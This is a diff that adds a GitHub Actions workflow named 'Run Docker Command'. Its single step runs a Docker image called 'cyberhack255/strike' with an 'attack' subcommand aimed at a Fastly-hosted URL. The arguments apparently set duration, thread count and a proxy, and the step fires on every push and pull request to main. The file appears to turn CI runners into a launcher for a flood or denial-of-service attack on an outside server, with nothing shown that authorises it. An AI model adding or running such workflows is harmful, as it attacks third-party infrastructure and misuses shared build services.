@@ -1,0 +1,22 @@
+name: Run Docker Command
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  run-docker-command:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Run Docker command
+        run: docker run --rm -ti cyberhack255/strike attack https://testngwaf.global.ssl.fastly.net 300 1000 $PROXY 1000
+  
+
